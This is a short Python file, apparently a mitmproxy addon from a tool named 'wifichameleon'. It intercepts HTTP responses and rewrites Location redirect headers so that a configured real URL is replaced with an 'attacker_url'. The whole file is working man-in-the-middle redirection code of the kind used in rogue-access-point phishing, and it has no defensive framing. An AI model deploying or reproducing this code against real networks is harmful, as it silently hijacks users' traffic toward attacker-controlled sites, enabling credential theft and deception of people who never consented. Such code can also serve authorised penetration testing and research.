from wifichameleon.utils.util import read_settings

settings = read_settings()
real_url = settings['real_url']
attacker_url = settings['attacker_url']

class replaceLocation:
    def response(self, flow):
        if "Location" in flow.response.headers and real_url in flow.response.headers["Location"]:
            ori_url = flow.response.headers["Location"]
            new_url = ori_url.replace(real_url, attacker_url)
            # print("Modified:", ori_url, new_url)
            flow.response.headers["Location"] = new_url

addons = [
    replaceLocation()
]